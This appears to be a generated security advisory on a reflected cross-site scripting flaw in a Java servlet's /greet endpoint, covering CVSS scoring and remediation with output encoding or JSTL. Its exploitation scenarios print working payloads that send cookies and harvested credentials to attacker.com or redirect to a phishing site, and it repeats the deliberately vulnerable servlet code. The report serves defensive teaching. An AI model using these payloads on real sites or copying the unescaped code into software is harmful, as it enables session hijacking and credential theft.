# Reflected Cross-Site Scripting (XSS) in Java Servlet

# Vulnerability Case
During the security assessment of Acme Corp’s legacy Java web application, we identified an instance where unsanitized user input was sent directly to the HTTP response via a `PrintWriter` without the mediation of a view technology like JavaServer Faces (JSF). This discovery was made after reviewing the audit logs that flagged direct writes to a `Writer` object, indicating that user-supplied data bypassed standard HTML escaping mechanisms. The issue was traced to a servlet running on an Apache Tomcat server with legacy Struts integrations, where raw request parameters were concatenated into HTML responses. Such behavior creates a Reflected Cross-Site Scripting (XSS) risk, potentially enabling attackers to inject custom scripts into the browser context.

```java
@WebServlet("/greet")
public class GreetingServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, 
                         HttpServletResponse response)
                         throws ServletException, IOException {
        String userName = request.getParameter("name");
        response.setContentType("text/html");
        PrintWriter writer = response.getWriter();
        // Vulnerable usage: Direct concatenation of unsanitized user input.
        writer.println("<html><body>");
        writer.println("<h1>Hello " + userName + "!</h1>");
        writer.println("</body></html>");
    }
}
```

The vulnerability stems from using a direct output stream for rendering responses, which bypasses the automatic HTML escaping provided by templating technologies like JSF. An attacker could craft a malicious URL by embedding JavaScript payloads (e.g., injecting `<script>alert('XSS');</script>`) in the `name` parameter, leading to immediate script execution in the victim's browser. Exploitation may facilitate session hijacking, credential theft, or redirection to malicious sites, thereby significantly compromising user trust and business reputation. Given Acme Corp's reliance on a mixed technology stack—Apache Tomcat, Struts, and legacy Java technologies—the risk is amplified across distributed client environments.


context: java.lang.security.audit.xss.no-direct-response-writer.no-direct-response-writer Detected a request with potential user-input going into a OutputStream or Writer object. This bypasses any view or template environments, including HTML escaping, which may expose this application to cross-site scripting (XSS) vulnerabilities. Consider using a view technology such as JavaServer Faces (JSFs) which automatically escapes HTML views.

# Vulnerability Breakdown
This vulnerability represents a classic Reflected Cross-Site Scripting (XSS) issue where unsanitized user input is directly incorporated into HTML output without encoding.

1. **Key vulnerability elements**:
   - Direct concatenation of user-supplied input (`request.getParameter("name")`) into HTML output
   - Use of raw `PrintWriter` instead of a template engine with automatic escaping
   - Servlet directly writing to the response without any sanitization
   - Running in a mixed technology environment (Tomcat, Struts, legacy Java)

2. **Potential attack vectors**:
   - Crafted URLs containing JavaScript code in the "name" parameter
   - Phishing emails with malicious links targeting Acme Corp users
   - Social engineering attacks tricking users into clicking malicious links
   - Potentially wormable if the application has social or sharing features

3. **Severity assessment**:
   - Network-accessible attack vector increases exposure
   - User interaction required (victim must click malicious link)
   - No privileges needed to execute the attack
   - Potential for session hijacking, credential theft, and client-side attacks
   - Unchanged scope as impact limited to the victim's browser context

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

# Description
A Reflected Cross-Site Scripting (XSS) vulnerability exists in Acme Corp's legacy Java web application, specifically in the `GreetingServlet` class that processes the `/greet` endpoint. The vulnerable code directly concatenates unsanitized user input from the `name` request parameter into an HTML response without any encoding or escaping:

```java
@WebServlet("/greet")
public class GreetingServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, 
                         HttpServletResponse response)
                         throws ServletException, IOException {
        String userName = request.getParameter("name");
        response.setContentType("text/html");
        PrintWriter writer = response.getWriter();
        // Vulnerable usage: Direct concatenation of unsanitized user input.
        writer.println("<html><body>");
        writer.println("<h1>Hello " + userName + "!</h1>");
        writer.println("</body></html>");
    }
}

```

This vulnerability allows attackers to inject malicious JavaScript code via the `name` parameter. When a victim visits a crafted URL like `https://acme-app.com/greet?name=<script>alert('XSS');</script>`, the injected script executes in their browser, potentially leading to session hijacking, credential theft, or redirection to malicious websites.

# CVSS
**Score**: 5.4 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N \
**Severity**: Medium

The Medium severity rating (5.4) is based on the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability is exploitable remotely over the internet, allowing the widest possible attack surface.

- **Low Attack Complexity (AC:L)**: Exploitation is straightforward and doesn't require any special conditions or preparation. Crafting a malicious URL with JavaScript in the name parameter is trivial.

- **No Privileges Required (PR:N)**: An attacker doesn't need any level of authentication or authorization to exploit the vulnerability.

- **User Interaction Required (UI:R)**: Exploitation requires a victim to click on a malicious link or otherwise visit a specially crafted URL, limiting the attack's reach.

- **Unchanged Scope (S:U)**: The vulnerability only affects resources managed by the same security authority. The impact is confined to the user's browser session.

- **Low Confidentiality Impact (C:L)**: Successful exploitation could expose sensitive browser data like cookies and session identifiers.

- **Low Integrity Impact (I:L)**: The attacker can modify data within the user's browser context, potentially altering visible content or executing unwanted actions.

- **No Availability Impact (A:N)**: The vulnerability doesn't affect the availability of the application itself.

The primary risk is unauthorized access to user sessions through cookie theft, with potential for phishing attacks through page content manipulation.

# Exploitation Scenarios
**Scenario 1: Session Hijacking**
An attacker crafts a malicious URL like `https://acme-app.com/greet?name=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>` and distributes it through email, social media, or compromised websites. When a victim with an active session clicks the link, the injected JavaScript executes in their browser and sends their session cookie to the attacker's server. The attacker can then use this cookie to impersonate the victim and gain unauthorized access to their account.

**Scenario 2: Credential Harvesting**
An attacker creates a URL with a payload that injects a fake login form into the page: `https://acme-app.com/greet?name=<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white"><h2>Session Expired</h2><form onsubmit="fetch('https://attacker.com/steal',{method:'POST',body:JSON.stringify({u:this.username.value,p:this.password.value})});return false"><input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password"><button>Login</button></form></div>`. When a user enters their credentials, they're sent to the attacker's server instead of the legitimate application.

**Scenario 3: Malicious Redirect**
An attacker designs a URL with a payload that automatically redirects users to a phishing site: `https://acme-app.com/greet?name=<script>window.location='https://fake-acme-portal.com'</script>`. When users click this link, they're immediately redirected to the malicious site, which may be designed to look identical to the legitimate Acme application.

# Impact Analysis
**Business Impact:**
- Potential unauthorized access to user accounts and sensitive data through session hijacking
- Risk of credential theft leading to broader system compromise
- Damage to company reputation and erosion of user trust if attacks become public
- Potential regulatory violations and fines if personal data is exposed (GDPR, CCPA, etc.)
- Legal liability if customer data is compromised
- Costs associated with incident response, investigation, and remediation
- Negative impact on customer retention and acquisition if security incidents occur

**Technical Impact:**
- Execution of arbitrary JavaScript code in users' browsers within the application's domain
- Access to sensitive browser data including cookies, local/session storage, and potentially autofilled form data
- Ability to make authenticated requests on behalf of victims via their hijacked sessions
- Bypass of browser security mechanisms like same-origin policy, as the injected code runs in the context of the legitimate domain
- Potential for DOM manipulation to create convincing phishing interfaces within the trusted application
- Risk of lateral movement if the compromised user has administrative privileges
- Possible browser fingerprinting and tracking of affected users

# Technical Details
The vulnerability exists in the `GreetingServlet` class which directly concatenates unsanitized user input into HTML output:

```java
@WebServlet("/greet")
public class GreetingServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, 
                         HttpServletResponse response)
                         throws ServletException, IOException {
        String userName = request.getParameter("name");
        response.setContentType("text/html");
        PrintWriter writer = response.getWriter();
        // Vulnerable usage: Direct concatenation of unsanitized user input.
        writer.println("<html><body>");
        writer.println("<h1>Hello " + userName + "!</h1>");
        writer.println("</body></html>");
    }
}

```

**Vulnerability Mechanics:**

1. The application uses `request.getParameter("name")` to retrieve user input from the query string or form data
2. This input is directly concatenated into the HTML output using `writer.println("<h1>Hello " + userName + "!</h1>")`
3. No validation or encoding is performed on the user input
4. The response is sent with `text/html` content type, causing browsers to interpret any HTML or JavaScript in the injected value

**Why This Is Vulnerable:**

Modern web frameworks typically provide automatic HTML escaping for template variables. However, this application:

1. Uses direct `PrintWriter` output instead of a template engine
2. Manually constructs HTML without encoding special characters
3. Bypasses built-in XSS protections that would normally be present in frameworks like JSF

**Attack Flow:**

1. Attacker crafts a URL with malicious code: `https://acme-app.com/greet?name=<script>alert('XSS');</script>`
2. Victim visits the malicious URL (through clicking a link, redirect, etc.)
3. Server processes the request and includes the unescaped script tag in the response
4. Browser renders the page and executes the injected JavaScript in the context of acme-app.com domain
5. Malicious script can now access cookies, local storage, and perform actions on behalf of the user

**Technical Risk Factors:**

- The legacy nature of the application (Tomcat + Struts) suggests limited modern security controls
- Direct server output bypasses framework protections that would normally prevent XSS
- The vulnerability exists in a GET endpoint, making exploitation via URL sharing particularly easy
- The servlet appears to have no CSRF protection, potentially allowing chained attacks

# Remediation Steps
## Implement HTML Output Encoding

**Priority**: P0

Modify the servlet to encode user input before including it in HTML output. Use the OWASP Java Encoder or Apache Commons Text for proper HTML encoding:

```java
@WebServlet("/greet")
public class GreetingServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, 
                         HttpServletResponse response)
                         throws ServletException, IOException {
        String userName = request.getParameter("name");
        response.setContentType("text/html");
        PrintWriter writer = response.getWriter();
        
        // Import required: org.owasp.encoder.Encode
        String encodedUserName = Encode.forHtml(userName);
        
        writer.println("<html><body>");
        writer.println("<h1>Hello " + encodedUserName + "!</h1>");
        writer.println("</body></html>");
    }
}

```

Alternatively, if using Apache Commons Text:

```java
// Import required: org.apache.commons.text.StringEscapeUtils
String encodedUserName = StringEscapeUtils.escapeHtml4(userName);

```

This approach properly escapes HTML special characters, preventing script injection while maintaining the original servlet structure.
## Migrate to a Template Engine with Auto-Escaping

**Priority**: P1

Replace direct PrintWriter usage with a modern template engine that provides automatic HTML escaping. For a servlet-based application, JSP with JSTL or Thymeleaf are good options:

**Option 1: Using JSP with JSTL**

```java
@WebServlet("/greet")
public class GreetingServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, 
                         HttpServletResponse response)
                         throws ServletException, IOException {
        String userName = request.getParameter("name");
        
        // Set the attribute to be used in the JSP
        request.setAttribute("userName", userName);
        
        // Forward to the JSP page
        request.getRequestDispatcher("/WEB-INF/greeting.jsp")
               .forward(request, response);
    }
}

```

With a JSP file at `/WEB-INF/greeting.jsp`:

```jsp
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html>
<body>
    <h1>Hello <c:out value="${userName}" />!</h1>
</body>
</html>

```

This approach leverages the built-in XSS protection of JSTL's `<c:out>` tag, which automatically HTML-encodes output by default.


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
